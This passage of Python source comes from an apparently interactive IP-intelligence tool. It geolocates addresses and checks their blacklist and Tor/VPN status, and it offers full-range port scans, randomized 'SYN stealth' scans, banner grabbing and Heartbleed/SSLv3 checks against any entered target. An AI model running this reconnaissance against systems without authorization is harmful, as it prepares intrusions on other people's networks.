        url = engine['url']
        if 'file://' in url or 'upload manually' in url:
            url = f"{engine['name']} (upload manually)"
        print(f" {Wh}[+] {engine['name']:<15}: {C}{url}{RS}")
    
    if is_local:
        print(f"\n{Gr}[+] Local file: {os.path.basename(image_input)}")
        print(f"{Wh} Size: {Gr}{os.path.getsize(image_input):,} bytes")
        print(f"{Wh} Last Modified: {Gr}{datetime.fromtimestamp(os.path.getmtime(image_input)).isoformat()}")
        metadata = extract_metadata(image_input)
        if metadata:
            print(f"\n{Y}[*] Found metadata ({len(metadata)} fields):{Wh}")
            for key in ["Make", "Model", "DateTimeOriginal", "GPS_Latitude", "GPS_Longitude", 
                        "Google_Maps_URL", "Image_Dimensions", "Image_Format", "GPS_Coordinates", "Software"]:
                if key in metadata:
                    print(f"    {Wh}{key:<20}: {Gr}{metadata[key][:100]}")
            other_count = len(metadata) - sum(1 for k in ["Make", "Model", "DateTimeOriginal", "GPS_Latitude", "GPS_Longitude", "Google_Maps_URL", "Image_Dimensions", "Image_Format", "GPS_Coordinates", "Software"] if k in metadata)
            if other_count > 0:
                print(f"    {Y}... and {other_count} more metadata fields (use Metadata Extractor)")
    
    if result.get('possible_matches'):
        print(f"\n{Y}[*] Possible matches:{Wh}")
        for match in result['possible_matches']:
            print(f"    {Wh}- Source: {Gr}{match.get('source')} | Confidence: {match.get('confidence')}%")
            if match.get('location'):
                print(f"      Location: {C}{match['location']}{RS}")
    
    input(f"\n{Wh}[+{Wh}] Press Enter to continue")

DESIRED_EXTENSIONS = {
    'html': ['.html', '.htm', '.php', '.asp', '.aspx', '.jsp', '.do', '.action', '.cfm', '.shtml'],
    'images': ['.jpg', '.jpeg', '.png', '.gif', '.svg', '.webp', '.bmp', '.ico', '.tiff', '.avif'],
    'styles': ['.css', '.scss', '.sass', '.less', '.styl'],
    'scripts': ['.js', '.mjs', '.ts', '.jsx', '.tsx', '.vue', '.jsonp'],
    'fonts': ['.woff', '.woff2', '.ttf', '.eot', '.otf', '.font'],
    'documents': ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.rtf', '.md', '.csv'],
    'media': ['.mp4', '.mp3', '.webm', '.ogg', '.wav', '.flv', '.avi', '.mov', '.mkv', '.wmv', '.m4a', '.aac'],
    'archives': ['.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.zst'],
    'data': ['.json', '.xml', '.yaml', '.yml', '.rss', '.atom', '.xml.gz'],
}
ALL_EXTS_FLAT = {ext for exts in DESIRED_EXTENSIONS.values() for ext in exts}


def advanced_ip_lookup(ip: str) -> Dict:
    """بحث متقدم عن IP من مصادر متعددة مجانية"""
    results = {}
    
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", timeout=8)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'success':
                results['ip_api'] = {
                    'location': f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}",
                    'coordinates': f"{data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}",
                    'isp': data.get('isp', 'N/A'),
                    'org': data.get('org', 'N/A'),
                    'as': data.get('as', 'N/A'),
                    'asname': data.get('asname', 'N/A'),
                    'mobile': data.get('mobile', False),
                    'proxy': data.get('proxy', False),
                    'hosting': data.get('hosting', False),
                    'timezone': data.get('timezone', 'N/A'),
                    'currency': data.get('currency', 'N/A'),
                }
    except: pass
    
    try:
        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=8)
        if resp.status_code == 200:
            data = resp.json()
            if 'bogon' not in data:
                results['ipinfo'] = {
                    'hostname': data.get('hostname', 'N/A'),
                    'city': data.get('city', 'N/A'),
                    'region': data.get('region', 'N/A'),
                    'country': data.get('country', 'N/A'),
                    'location': data.get('loc', 'N/A'),
                    'org': data.get('org', 'N/A'),
                    'postal': data.get('postal', 'N/A'),
                    'timezone': data.get('timezone', 'N/A'),
                }
    except: pass
    
    try:
        resp = requests.get(f"https://ipgeolocation.abstractapi.com/v1/?ip_address={ip}", timeout=8)
        if resp.status_code == 200:
            data = resp.json()
            if 'error' not in data:
                results['abstract'] = {
                    'city': data.get('city', 'N/A'),
                    'region': data.get('region', 'N/A'),
                    'country': data.get('country', 'N/A'),
                    'latitude': data.get('latitude', 'N/A'),
                    'longitude': data.get('longitude', 'N/A'),
                    'connection': data.get('connection', {}).get('autonomous_system_number', 'N/A'),
                }
    except: pass
    
    return results

def check_ip_reputation_free(ip: str) -> Dict:
    """التحقق من سمعة IP باستخدام خدمات مجانية"""
    reputation = {
        'abuse_score': 0,
        'threat_level': 'Low',
        'blacklists': [],
        'reports': 0,
        'is_tor': False,
        'is_vpn': False,
        'is_datacenter': False,
        'is_spam': False
    }
    
    API_KEY = ""
    if API_KEY:
        try:
            headers = {'Key': API_KEY, 'Accept': 'application/json'}
            resp = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}&maxAgeInDays=90", headers=headers, timeout=8)
            if resp.status_code == 200:
                data = resp.json().get('data', {})
                reputation['abuse_score'] = data.get('abuseConfidenceScore', 0)
                reputation['reports'] = data.get('totalReports', 0)
                reputation['blacklists'] = [c['name'] for c in data.get('categories', [])[:5]]
                if reputation['abuse_score'] >= 75:
                    reputation['threat_level'] = 'Critical'
                elif reputation['abuse_score'] >= 50:
                    reputation['threat_level'] = 'High'
                elif reputation['abuse_score'] >= 25:
                    reputation['threat_level'] = 'Medium'
        except: pass
    
    reversed_ip = '.'.join(reversed(ip.split('.')))
    dnsbl_servers = [
        'zen.spamhaus.org', 'b.barracudacentral.org', 'bl.spamcop.net',
        'dnsbl.sorbs.net', 'cbl.abuseat.org', 'psbl.surriel.com'
    ]
    
    for server in dnsbl_servers:
        try:
            query = f"{reversed_ip}.{server}"
            socket.gethostbyname(query)
            reputation['blacklists'].append(server.split('.')[0])
        except socket.gaierror:
            pass
        except:
            pass
    
    try:
        resp = requests.get(f"https://check.torproject.org/torbulkexitlist", timeout=10)
        if ip in resp.text:
            reputation['is_tor'] = True
            reputation['threat_level'] = 'High'
    except: pass
    
    try:
        resp = requests.get(f"https://vpnapi.io/api/{ip}", timeout=8)
        if resp.status_code == 200:
            data = resp.json()
            reputation['is_vpn'] = data.get('security', {}).get('vpn', False)
            reputation['is_datacenter'] = data.get('security', {}).get('hosting', False)
    except: pass
    
    return reputation

def trace_route_visual(ip: str) -> List[Dict]:
    """تتبع مسار IP مع معلومات جغرافية لكل قفزة"""
    hops = []
    
    import subprocess
    import platform
    
    system = platform.system()
    try:
        if system == "Windows":
            cmd = ['tracert', '-d', '-h', '15', ip]
        else:
            cmd = ['traceroute', '-m', '15', '-n', ip]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        lines = result.stdout.split('\n')
        
        for line in lines:
            ips_found = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
            for hop_ip in ips_found:
                if hop_ip not in ['0.0.0.0', '*']:
                    try:
                        geo = requests.get(f"http://ip-api.com/json/{hop_ip}?fields=country,city,lat,lon", timeout=5)
                        if geo.status_code == 200:
                            geo_data = geo.json()
                            hops.append({
                                'ip': hop_ip,
                                'country': geo_data.get('country', 'Unknown'),
                                'city': geo_data.get('city', 'Unknown'),
                                'lat': geo_data.get('lat'),
                                'lon': geo_data.get('lon')
                            })
                    except:
                        hops.append({'ip': hop_ip, 'country': 'Unknown', 'city': 'Unknown'})
                    if len(hops) >= 15:
                        break
            if len(hops) >= 15:
                break
    except:
        pass
    
    return hops

def get_ip_weather(ip: str) -> Dict:
    """جلب حالة الطقس بناءً على موقع IP"""
    weather = {}
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=lat,lon,city,country", timeout=8)
        if resp.status_code == 200:
            data = resp.json()
            lat = data.get('lat')
            lon = data.get('lon')
            city = data.get('city', 'Unknown')
            
            if lat and lon:
                weather_resp = requests.get(f"https://wttr.in/{lat},{lon}?format=%c+%t+%w+%h", timeout=10)
                if weather_resp.status_code == 200:
                    weather['conditions'] = weather_resp.text.strip()
                    weather['city'] = city
                    
                meteoresp = requests.get(f"https://api.open-meteo.com/v1/forecast?latitude={lat}&longitude={lon}&current_weather=true", timeout=10)
                if meteoresp.status_code == 200:
                    mdata = meteoresp.json().get('current_weather', {})
                    weather['temperature_c'] = mdata.get('temperature')
                    weather['windspeed'] = mdata.get('windspeed')
                    weather['winddirection'] = mdata.get('winddirection')
    except:
        pass
    
    return weather

def get_nearby_networks(ip: str) -> List[Dict]:
    """العثور على الشبكات القريبة من IP (نفس الـ ASN)"""
    nearby = []
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=as", timeout=8)
        if resp.status_code == 200:
            asn_data = resp.json().get('as', '')
            asn_number = re.search(r'AS(\d+)', asn_data)
            if asn_number:
                asn = asn_number.group(1)
                sample_ips = [
                    f"{'.'.join(ip.split('.')[:2])}.{i}.{j}" 
                    for i in range(1, 10) for j in range(1, 10)
                ][:20]
                
                for sample in sample_ips:
                    try:
                        check = requests.get(f"http://ip-api.com/json/{sample}?fields=status,as,country,city", timeout=3)
                        if check.status_code == 200:
                            cdata = check.json()
                            if cdata.get('status') == 'success' and asn in cdata.get('as', ''):
                                nearby.append({
                                    'ip': sample,
                                    'country': cdata.get('country', 'N/A'),
                                    'city': cdata.get('city', 'N/A')
                                })
                    except:
                        pass
                    if len(nearby) >= 5:
                        break
    except:
        pass
    
    return nearby

def get_historical_ip_data(ip: str) -> Dict:
    """البيانات التاريخية لـ IP (متى تغيرت آخر مرة)"""
    historical = {}
    try:
        resp = requests.get(f"https://api.bgpview.io/ip/{ip}", timeout=10)
        if resp.status_code == 200:
            data = resp.json().get('data', {})
            historical = {
                'prefix': data.get('prefix', 'N/A'),
                'asn': data.get('asn', {}).get('asn', 'N/A'),
                'asn_name': data.get('asn', {}).get('name', 'N/A'),
                'asn_description': data.get('asn', {}).get('description', 'N/A'),
            }
    except: pass
    
    try:
        import subprocess
        result = subprocess.run(['whois', ip], capture_output=True, text=True, timeout=10)
        for line in result.stdout.split('\n'):
            if 'NetRange' in line or 'CIDR' in line:
                historical['netrange'] = line.strip()
            if 'RegDate' in line or 'registration' in line.lower():
                historical['registration_date'] = line.strip()
    except: pass
    
    return historical

def scan_ip_services(ip: str) -> Dict:
    """فحص الخدمات الشائعة على IP (HTTP, HTTPS, SSH, FTP)"""
    services = {}
    common_ports_web = [80, 443, 8080, 8443, 3000, 5000, 8000]
    
    for port in common_ports_web:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                service_name = {80: 'HTTP', 443: 'HTTPS', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 
                               3000: 'Node.js', 5000: 'Python/Flask', 8000: 'Python/Django'}.get(port, 'Unknown')
                services[port] = service_name
                
                if port in [80, 443, 8080, 8443]:
                    try:
                        proto = 'https' if port in [443, 8443] else 'http'
                        resp = requests.get(f"{proto}://{ip}:{port}", timeout=3, verify=False)
                        server_header = resp.headers.get('Server', '')
                        if server_header:
                            services[f"{port}_server"] = server_header
                    except:
                        pass
        except:
            pass
    
    return services

def generate_ip_fingerprint(ip: str) -> Dict:
    """إنشاء بصمة رقمية فريدة للـ IP"""
    fingerprint = {}
    
    try:
        fingerprint['ttl_guess'] = "Unknown"
        
        special_ports = [22, 23, 25, 53, 110, 143, 993, 995, 3306, 3389, 5432, 5900, 6379]
        open_special = []
        for port in special_ports:
            try:
                sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock2.settimeout(0.5)
                if sock2.connect_ex((ip, port)) == 0:
                    open_special.append(port)
                sock2.close()
            except:
                pass
        fingerprint['open_special_ports'] = open_special
        
        try:
            resp = requests.get(f"http://{ip}", timeout=3)
            fingerprint['http_server'] = resp.headers.get('Server', 'Unknown')
            fingerprint['http_powered'] = resp.headers.get('X-Powered-By', 'Unknown')
        except:
            pass
        
        if 443 in fingerprint.get('open_special_ports', []):
            try:
                import ssl
                ctx = ssl.create_default_context()
                with ctx.wrap_socket(socket.socket(), server_hostname=ip) as s:
                    s.settimeout(3)
                    s.connect((ip, 443))
                    cert = s.getpeercert()
                    fingerprint['ssl_issuer'] = dict(cert.get('issuer', [])).get('organizationName', 'N/A')
                    fingerprint['ssl_expiry'] = cert.get('notAfter', 'N/A')
            except:
                pass
    except:
        pass
    
    return fingerprint

def create_ip_map_url(ip: str, lat: float, lon: float) -> Dict:
    """إنشاء روابط خرائط متعددة"""
    return {
        'google_maps': f"https://www.google.com/maps/@{lat},{lon},12z",
        'openstreetmap': f"https://www.openstreetmap.org/?mlat={lat}&mlon={lon}&zoom=12",
        'bing_maps': f"https://www.bing.com/maps?cp={lat}~{lon}&lvl=12",
        'yandex_maps': f"https://yandex.com/maps/?ll={lon}%2C{lat}&z=12",
        'here_maps': f"https://www.here.com/?map={lat},{lon},12,satellite",
        'opentopomap': f"https://opentopomap.org/#map=12/{lat}/{lon}"
    }

def get_ip_risk_score(ip: str) -> Dict:
    """حساب درجة المخاطرة الإجمالية للـ IP"""
    score = 0
    reasons = []
    
    reputation = check_ip_reputation_free(ip)
    
    if reputation['abuse_score'] >= 50:
        score += 40
        reasons.append(f"High abuse score: {reputation['abuse_score']}%")
    
    if reputation['is_tor']:
        score += 30
        reasons.append("TOR exit node detected")
    
    if reputation['is_vpn']:
        score += 25
        reasons.append("VPN detected")
    
    if reputation['is_datacenter']:
        score += 15
        reasons.append("Datacenter/Hosting IP")
    
    if reputation['blacklists']:
        score += 20
        reasons.append(f"Listed in {len(reputation['blacklists'])} blacklists")
    
    dangerous_ports = [445, 3389, 23, 25]
    open_dangerous = []
    for port in dangerous_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((ip, port)) == 0:
                open_dangerous.append(port)
            sock.close()
        except:
            pass
    
    if open_dangerous:
        score += len(open_dangerous) * 10
        reasons.append(f"Open dangerous ports: {open_dangerous}")
    
    if score >= 70:
        risk_level = "CRITICAL "
    elif score >= 50:
        risk_level = "HIGH 🟠"
    elif score >= 25:
        risk_level = "MEDIUM 🟡"
    else:
        risk_level = "LOW 🟢"
    
    return {
        'score': min(100, score),
        'level': risk_level,
        'reasons': reasons,
        'max_score': 100
    }

def ip_whois_detailed(ip: str) -> Dict:
    """استعلام WHOIS مفصل للـ IP"""
    whois_info = {}
    
    try:
        import subprocess
        result = subprocess.run(['whois', ip], capture_output=True, text=True, timeout=15)
        output = result.stdout.lower()
        
        patterns = {
            'netname': r'netname:\s*(.+)',
            'descr': r'descr:\s*(.+)',
            'country': r'country:\s*(.+)',
            'org': r'org(?:anization)?:\s*(.+)',
            'address': r'address:\s*(.+)',
            'phone': r'phone:\s*(.+)',
            'fax': r'fax:\s*(.+)',
            'e-mail': r'e-?mail:\s*(.+)',
            'mnt-by': r'mnt-by:\s*(.+)',
            'changed': r'changed:\s*(.+)',
            'source': r'source:\s*(.+)',
            'status': r'status:\s*(.+)'
        }
        
        for key, pattern in patterns.items():
            match = re.search(pattern, output, re.I)
            if match:
                whois_info[key] = match.group(1).strip()
    except:
        pass
    
    return whois_info

def get_blockchain_ip_check(ip: str) -> Dict:
    """التحقق مما إذا كان IP مرتبطًا بالعملات المشفرة"""
    crypto = {
        'is_crypto_node': False,
        'crypto_services': [],
        'mining_pool': False
    }
    
    try:
        resp = requests.get("https://bitnodes.io/api/v1/snapshots/latest/", timeout=10)
        if resp.status_code == 200:
            nodes = resp.json().get('nodes', {})
            if ip in nodes:
                crypto['is_crypto_node'] = True
                crypto['crypto_services'].append('Bitcoin')
    except:
        pass
    
    return crypto

def display_advanced_ip_info(ip: str, ip_data: Dict, lat, lon):
    """عرض معلومات IP المتقدمة بشكل منظم"""
    
    print(f"\n {Wh}{'='*55}")
    print(f" {R} ADVANCED IP ANALYSIS ")
    print(f" {Wh}{'='*55}")
    
    print(f"\n{Y}[*] THREAT INTELLIGENCE & REPUTATION{Wh}")
    risk = get_ip_risk_score(ip)
    print(f" {Wh} Risk Score      : {risk['level']} ({risk['score']}/100)")
    if risk['reasons']:
        for reason in risk['reasons'][:3]:
            print(f" {Wh}    {R} {reason}{Wh}")
    
    print(f"\n{Y}[*] ENRICHED GEOLOCATION DATA{Wh}")
    advanced_geo = advanced_ip_lookup(ip)
    
    for source, data in advanced_geo.items():
        if data:
            print(f" {Wh} From {source.upper()}:")
            if 'location' in data:
                print(f" {Wh}    Location : {Gr}{data.get('location', 'N/A')}{Wh}")
            if 'isp' in data:
                print(f" {Wh}    ISP      : {Gr}{data.get('isp', 'N/A')}{Wh}")
            if 'asname' in data:
                print(f" {Wh}    AS Name  : {Gr}{data.get('asname', 'N/A')}{Wh}")
            if 'mobile' in data:
                print(f" {Wh}    Mobile   : {Gr}{'Yes' if data['mobile'] else 'No'}{Wh}")
    
    if lat and lon and lat != 'N/A' and lon != 'N/A':
        try:
            lat_f = float(lat) if isinstance(lat, (int, float)) else float(str(lat).replace(',', '.'))
            lon_f = float(lon) if isinstance(lon, (int, float)) else float(str(lon).replace(',', '.'))
            maps = create_ip_map_url(ip, lat_f, lon_f)
            print(f"\n{Y}[*] MAPS & SATELLITE VIEW{Wh}")
            for name, url in maps.items():
                print(f" {Wh} {name.replace('_', ' ').title()}:{RS}")
                print(f" {Wh}    {C}{url[:70]}...{RS}" if len(url) > 70 else f" {Wh}    {C}{url}{RS}")
        except:
            pass
    
    print(f"\n{Y}[*] NETWORK ROUTE TRACE (First 8 hops){Wh}")
    trace = trace_route_visual(ip)
    if trace:
        for i, hop in enumerate(trace[:8], 1):
            print(f" {Wh} Hop {i:<2} : {Gr}{hop.get('ip', 'N/A'):<16}{Wh} [{hop.get('country', 'N/A')}, {hop.get('city', 'N/A')}]")
    else:
        print(f" {Wh} {Y}Traceroute unavailable (requires system command)")
    
    print(f"\n{Y}[*] DETECTED SERVICES{Wh}")
    services = scan_ip_services(ip)
    if services:
        for port, service in services.items():
            if isinstance(service, str) and not str(port).endswith('_server'):
                print(f" {Wh} Port {port:<5} : {Gr}{service}{Wh}")
                server_key = f"{port}_server"
                if server_key in services:
                    print(f" {Wh}    Server: {C}{services[server_key]}{Wh}")
    else:
        print(f" {Wh} {Y}No common services detected")
    
    print(f"\n{Y}[*] WHOIS REGISTRATION DATA{Wh}")
    whois_detailed = ip_whois_detailed(ip)
    if whois_detailed:
        for key, value in list(whois_detailed.items())[:6]:
            print(f" {Wh} {key.replace('_', ' ').title():<12}: {Gr}{value[:50]}{Wh}")
    else:
        print(f" {Wh} {Y}Detailed WHOIS not available")
    
    print(f"\n{Y}[*] WEATHER INFORMATION{Wh}")
    weather = get_ip_weather(ip)
    if weather:
        print(f" {Wh} Location    : {Gr}{weather.get('city', 'N/A')}{Wh}")
        if weather.get('conditions'):
            print(f" {Wh} Conditions  : {C}{weather['conditions']}{Wh}")
        if weather.get('temperature_c'):
            print(f" {Wh} Temperature : {Gr}{weather['temperature_c']}°C{Wh}")
        if weather.get('windspeed'):
            print(f" {Wh} Wind        : {Gr}{weather['windspeed']} km/h{Wh}")
    
    print(f"\n{Y}[*] DEVICE FINGERPRINTING{Wh}")
    fingerprint = generate_ip_fingerprint(ip)
    if fingerprint.get('http_server'):
        print(f" {Wh} HTTP Server : {Gr}{fingerprint['http_server']}{Wh}")
    if fingerprint.get('open_special_ports'):
        print(f" {Wh} Special open: {Gr}{fingerprint['open_special_ports']}{Wh}")
    if fingerprint.get('ssl_issuer'):
        print(f" {Wh} SSL Issuer  : {Gr}{fingerprint['ssl_issuer']}{Wh}")

def masscan_ip_engine():
    """MASSCAN Engine — Direct access to masscan-powered IP scanning features"""
    ip = input(f"\n{Wh}[?] Enter IP target {Gr}[e.g., 8.8.8.8]{Wh}: {Gr}").strip()
    if not validate_ip(ip):
        print(f"{R}[!] Invalid IP address!")
        input(f"\n{Wh}[+{Wh}] Press Enter")
        return

    print(f"\n {Wh}{'='*55}")
    print(f" {R}MASSCAN ENGINE — ADVANCED IP SCANNING")
    print(f" {Wh}{'='*55}")
    print(f"{Wh} Target: {C}{ip}{RS}")
    print(f"{Wh}{'='*55}")

    while True:
        print(f"\n{Wh}[*] Select operation:")
        print(f"  {R}[{Gr}1{R}]{Wh} Port range scan (masscan-style)")
        print(f"  {R}[{Gr}2{R}]{Wh} SYN stealth scan (randomized)")
        print(f"  {R}[{Gr}3{R}]{Wh} Banner grab + service fingerprint")
        print(f"  {R}[{Gr}4{R}]{Wh} Vulnerability check (Heartbleed/SSLv3/NTP)")
        print(f"  {R}[{Gr}5{R}]{Wh} ASync scan all ports (1-65535)")
        print(f"  {R}[{Gr}6{R}]{Wh} Exclude-list scan (skip specific ports)")
        print(f"  {R}[{Gr}7{R}]{Wh} Quick scan + all features")
        print(f"  {R}[{Gr}0{R}]{Wh} Back to previous menu")
        choice = input(f"\n{Wh}[+] Select {Gr}[0-7]{Wh}: {Gr}").strip()
        if choice == "0": break

        if choice == "1":
            pr = input(f"{Wh}[?] Port range {Gr}[e.g. 1-1000 or 22,80,443]{Wh}: {Gr}").strip() or "1-1024"
            rate = input(f"{Wh}[?] Rate (pps) {Gr}[5000]{Wh}: {Gr}").strip() or "5000"
            scanner = MassPortScanner(max_rate=int(rate))
            print(f"{Y}[*] Scanning {ip} ports {pr}...{Wh}")
            res = scanner.scan(ip, pr)
            if res:
                for p, s in sorted(res.items()):
                    print(f"  {Gr}[+] Port {p:<5} ({s})")
            else:
                print(f"  {Y}[-] No open ports{Wh}")

        elif choice == "2":
            syn = SynScanner()
            pr = input(f"{Wh}[?] Ports {Gr}[e.g. 22,80,443 or 'common']{Wh}: {Gr}").strip()
            ports = PortRange.expand(pr) if pr and pr != "common" else PortRange.expand(PortRange.COMMON)
            rnd = randomize_scan_order(ports)
            print(f"{Y}[*] SYN stealth scan ({len(rnd)} ports, randomized)...{Wh}")
            res = syn.scan_range(ip, rnd, stealth=True)
            if res:
                for p, s in sorted(res.items()):
                    print(f"  {Gr}[+] Port {p:<5} ({s}) [SYN/Stealth]")
            else:
                print(f"  {Y}[-] All ports filtered/closed{Wh}")

        elif choice == "3":
            grabber = BannerGrabber()
            detect = ServiceDetector()
            pr = input(f"{Wh}[?] Ports {Gr}[e.g. 22,80,443] or 'open' to scan first{Wh}: {Gr}").strip()
            if pr == "open":
                open_ports = port_scan(ip)
                if not open_ports:
                    print(f"{Y}[-] No open ports found{Wh}")
                    continue
                ports = list(open_ports.keys())
            else:
                ports = PortRange.expand(pr) if pr else [80, 443, 22, 21, 25]
            print(f"{Y}[*] Grabbing banners from {len(ports)} ports...{Wh}")
            banners = grabber.grab_multi(ip, ports)
            detected = detect.detect_all(ip, {p: "unknown" for p in ports})
            for port in sorted(banners.keys()):
                info = banners[port]
                banner = info.get("banner", "")
                service = info.get("service", "unknown")
                print(f"\n  {Gr}[+] Port {port:<5} ({service})")
                if banner:
                    print(f"  {Wh}     Banner: {C}{banner[:150]}")
                if info.get("status_line"):
                    print(f"  {Wh}     Status: {Y}{info['status_line']}")
                if info.get("ssl_issuer"):
                    print(f"  {Wh}     SSL:    {Y}{info['ssl_issuer']}")

        elif choice == "4":
            vuln = VulnerabilityChecker()
            print(f"{Y}[*] Checking vulnerabilities on {ip}...{Wh}")
            results = vuln.check_all(ip)
            if results:
                for vt, vi in results.items():
                    print(f"  {R}[!] {vt}: {vi.get('details', 'Vulnerable')}{RS}")
            else:
                print(f"  {Gr}[+] No common vulnerabilities found{Wh}")

        elif choice == "5":
            print(f"{Y}[*] Async scan all 65535 ports (masscan-style)...{Wh}")
            print(f"{Y}    This may take a while...{Wh}")
            scanner = MassPortScanner(max_rate=10000)
            res = scanner.scan(ip, "1-65535")
            if res:
                print(f"  {Gr}[+] Found {len(res)} open ports:{Wh}")
                for p, s in sorted(res.items()):
                    print(f"    {Gr}[+] Port {p:<5} ({s})")
            else:
                print(f"  {Y}[-] No open ports found{Wh}")

        elif choice == "6":
            ports = input(f"{Wh}[?] Port range {Gr}[e.g. 1-1000]{Wh}: {Gr}").strip() or "1-1024"
            exclude = input(f"{Wh}[?] Exclude ports {Gr}[e.g. 80,443]{Wh}: {Gr}").strip()
            excl_list = PortRange.expand(exclude) if exclude else []
            scanner = MassPortScanner()
            res = scanner.scan(ip, ports, exclude=excl_list)
            if res:
                for p, s in sorted(res.items()):
                    print(f"  {Gr}[+] Port {p:<5} ({s})")
            else:
                print(f"  {Y}[-] No open ports{Wh}")

        elif choice == "7":
            print(f"{Y}[*] Full security assessment...{Wh}")
            open_ports = port_scan(ip)
            if open_ports:
                print(f"\n{Wh}[+] Open ports ({len(open_ports)}):")
                for p, s in sorted(open_ports.items()):
                    print(f"  {Gr}[+] {p:<5} ({s})")
                # Service detection
                detect = ServiceDetector()
                detected = detect.detect_all(ip, open_ports)
                print(f"\n{Wh}[+] Service fingerprinting:")
                for p, info in sorted(detected.items()):
                    svc = info.get("service", "?")
                    bn = info.get("banner", "")[:80]
                    print(f"  {Gr}[+] {p:<5} -> {svc}" + (f" ({bn})" if bn else ""))
                # Vulnerability check
                vuln = VulnerabilityChecker()
                vuln_res = vuln.check_all(ip)
                if vuln_res:
                    print(f"\n{R}[!] Vulnerabilities found:{Wh}")
                    for vt, vi in vuln_res.items():
                        print(f"  {R}[!] {vt}{RS}")
            else:
                print(f"  {Y}[-] No open ports (firewalled?){Wh}")

    input(f"\n{Wh}[+{Wh}] Press Enter")


def IP_Track():
    ip = input(f"\n{Wh}[?] Enter IP target {Gr}[e.g., 8.8.8.8]{Wh}: {Gr}").strip()
    if not validate_ip(ip):
        print(f"{R}[!] Invalid IP address!")
        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
        return
    
    print(f"\n {Wh}{'='*50}")
    print(f" {R}IP ADDRESS INFORMATION (ENHANCED)")
    print(f" {Wh}{'='*50}")
    
    ip_data = get_ip_info(ip)
    if not ip_data:
        print(f"{R}[!] Could not fetch IP information")
        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
        return
    
    hostname = ip_data.get("reverse_dns", "N/A")
    
    sec = ip_data.get("security", {})
    threat_score = ip_data.get("threat_score", sec.get("threat_score", "N/A"))
    is_proxy = ip_data.get("is_proxy", sec.get("proxy", False))
    is_vpn = ip_data.get("is_vpn", sec.get("vpn", False))
    is_tor = ip_data.get("is_tor", sec.get("tor", False))
    is_hosting = ip_data.get("is_hosting", sec.get("hosting", False))
    
    lat = ip_data.get("latitude", ip_data.get("lat", "N/A"))
    lon = ip_data.get("longitude", ip_data.get("lon", "N/A"))
    
    data = {
        "IP": ip,
        "Hostname": hostname,
        "Type": ip_data.get("type", "N/A"),
        "Proxy": "Yes" if is_proxy else "No",
        "VPN": "Yes" if is_vpn else "No",
        "Tor": "Yes" if is_tor else "No",
        "Hosting/DC": "Yes" if is_hosting else "No",
        "Threat Score": threat_score,
        "Country": ip_data.get("country", "N/A"),
        "Country Code": ip_data.get("country_code", ip_data.get("countryCode", "N/A")),
        "City": ip_data.get("city", "N/A"),
        "Region": ip_data.get("region", ip_data.get("regionName", "N/A")),
        "ZIP": ip_data.get("postal", ip_data.get("zip", "N/A")),
        "Latitude": lat,
        "Longitude": lon,
        "ISP": ip_data.get("connection", {}).get("isp", ip_data.get("isp", "N/A")),
        "Organization": ip_data.get("connection", {}).get("org", ip_data.get("org", "N/A")),
        "ASN": ip_data.get("connection", {}).get("asn", ip_data.get("as", "N/A")),
        "AS Name": ip_data.get("connection", {}).get("asn_org", ip_data.get("org", "N/A")),
        "Timezone": ip_data.get("timezone", {}).get("id", ip_data.get("timezone", "N/A")),
        "Continent": ip_data.get("continent", "N/A"),
    }
    
    for key, value in data.items():
        if value not in ("N/A", "unknown", None, False, "0"):
            print(f"{Wh} {key:<14}: {Gr}{value}")
    
    display_advanced_ip_info(ip, ip_data, lat, lon)
    
    print(f"\n{Y}[*] Checking abuse reports...{Wh}")
    abuse_data = check_ip_abuse(ip)
    reputation = check_ip_reputation_free(ip)
    
    if abuse_data.get("confidence", 0) > 0 or abuse_data.get("reports", 0) > 0:
        print(f"{R}[!] Abuse Confidence: {abuse_data['confidence']}% | Reports: {abuse_data['reports']}{Wh}")
        if abuse_data.get("categories"):
            print(f"{R}    Categories: {', '.join(abuse_data['categories'])}{Wh}")
    
    if reputation.get('blacklists'):
        print(f"{R}[!] Listed in blacklists: {', '.join(reputation['blacklists'][:5])}{Wh}")
    
    data["AbuseIPDB"] = abuse_data
    data["AdvancedReputation"] = reputation
    
    print(f"\n{Y}[?] Scan options: {Wh}")
    print(f"  {R}[{Gr}1{R}]{Wh} Quick scan (common ports)")
    print(f"  {R}[{Gr}2{R}]{Wh} SYN stealth scan (requires scapy)")
    print(f"  {R}[{Gr}3{R}]{Wh} Full banner grab + service detection")
    print(f"  {R}[{Gr}4{R}]{Wh} Vulnerability check (Heartbleed, SSLv3, NTP)")
    print(f"  {R}[{Gr}5{R}]{Wh} Mass scan with port range (e.g. 1-1000)")
    print(f"  {R}[{Gr}0{R}]{Wh} Skip scanning")
    scan_choice = input(f"\n{Wh}[+] Select {Gr}[0-5]{Wh}: {Gr}").strip()

    if scan_choice == "1":
        print(f"{Wh}\n[*] Quick scanning common ports...")
        ports_result = port_scan(ip)
        if ports_result:
            print(f"{Wh}\n[+] Open Ports Found:")
            service_names = {
                21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
                80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
                993: "IMAPS", 995: "POP3S", 3306: "MySQL", 3389: "RDP",
